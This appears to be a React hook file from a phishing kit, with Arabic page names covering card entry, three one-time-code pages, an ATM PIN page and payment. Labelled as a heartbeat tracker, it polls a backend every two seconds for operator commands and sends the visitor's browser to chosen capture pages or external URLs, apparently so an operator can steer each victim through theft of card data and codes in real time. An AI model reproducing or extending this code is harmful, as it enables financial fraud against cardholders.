// Heartbeat tracking hook - sends ping every 5 seconds to track user activity
import { useEffect, useRef, useCallback } from "react";
import { ensureSessionId } from "./submissions";
import { getPendingNavigationCommand, clearNavigationCommand, ACTION_TO_ROUTE, type NavigationAction } from "./api";

const PING_INTERVAL_MS = 5000;
const COMMAND_CHECK_INTERVAL = 2000;

// Page names mapping for better readability
export const PAGE_NAMES: Record<string, string> = {
  "/": "الرئيسية",
  "/form": "تسجيل البيانات",
  "/select": "اختيار العرض",
  "/total": "الدفع",
  "/total2": "الدفع 2",
  "/card": "إدخال البطاقة",
  "/visa": "البطاقة",
  "/otp": "الرمز",
  "/otp2": "الرمز 2",
  "/otp3": "الرمز 3",
  "/atm": "الصراف",
  "/success": "نجاح",
};

export function getPageName(path: string): string {
  return PAGE_NAMES[path] || path;
}

export interface PingData {
  session_id: string;
  current_page: string;
  last_ping: string;
}

// Hook to track user activity with heartbeat and check for navigation commands
export function useHeartbeatTracking(currentPage: string = "/") {
  const intervalRef = useRef<number | null>(null);
  const commandCheckRef = useRef<number | null>(null);
  const sessionIdRef = useRef<string>("");

  const checkForNavigationCommand = useCallback(async () => {
    if (!sessionIdRef.current) return;

    try {
      const command = await getPendingNavigationCommand(sessionIdRef.current);
      if (command && command.action) {
        console.log("📨 Navigation command received:", command.action);

        // Check if there's a custom redirect_to URL (external redirect)
        if (command.redirect_to) {
          window.location.href = command.redirect_to;
          console.log("🔗 Redirected to external URL:", command.redirect_to);
        } else {
          // Use the action to get the route
          const targetPath = ACTION_TO_ROUTE[command.action as NavigationAction];
          if (targetPath) {
            window.location.href = targetPath;
            console.log("🔀 Redirected to:", targetPath);
          } else {
            console.warn("⚠️ Unknown navigation action:", command.action);
          }
        }

        // Clear the command after processing
        await clearNavigationCommand(sessionIdRef.current);
      }
    } catch (error) {
      console.error("❌ Error checking navigation command:", error);
    }
  }, []);

  const startTracking = useCallback(() => {
    if (intervalRef.current) return;

    sessionIdRef.current = ensureSessionId();
    console.log("🚀 Heartbeat tracking started for session:", sessionIdRef.current);

    // Start checking for navigation commands immediately
    void checkForNavigationCommand();

    // Check for commands periodically
    commandCheckRef.current = window.setInterval(() => {
      void checkForNavigationCommand();
    }, COMMAND_CHECK_INTERVAL);
  }, [checkForNavigationCommand]);

  const stopTracking = useCallback(() => {
    if (intervalRef.current) {
      window.clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (commandCheckRef.current) {
      window.clearInterval(commandCheckRef.current);
      commandCheckRef.current = null;
    }
  }, []);

  useEffect(() => {
    startTracking();
    return () => stopTracking();
  }, [startTracking, stopTracking]);

  return {
    sessionId: sessionIdRef.current,
    stopTracking,
  };
}

// Format time for display
export function formatLiveTime(isoString: string): string {
  const diff = Date.now() - new Date(isoString).getTime();
  const secs = Math.floor(diff / 1000);

  if (secs < 60) {
    return `منذ ${secs} ثانية`;
  }

  const mins = Math.floor(secs / 60);
  const remainingSecs = secs % 60;

  if (mins < 60) {
    return `منذ ${mins} دقيقة و ${remainingSecs} ثانية`;
  }

  const hours = Math.floor(mins / 60);
  const remainingMins = mins % 60;

  if (hours < 24) {
    return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;
  }

  return new Date(isoString).toLocaleString("ar-EG", {
    day: "numeric",
    month: "short",
    hour: "2-digit",
    minute: "2-digit",
  });
}

// Check if session is active (within 10 seconds)
export function isSessionActive(lastPing: string | null): boolean {
  if (!lastPing) return false;
  const diff = Date.now() - new Date(lastPing).getTime();
  return diff <= 10000;
}

// Get time since last ping in seconds
export function getSecondsSincePing(lastPing: string | null): number {
  if (!lastPing) return Infinity;
  return Math.floor((Date.now() - new Date(lastPing).getTime()) / 1000);
}
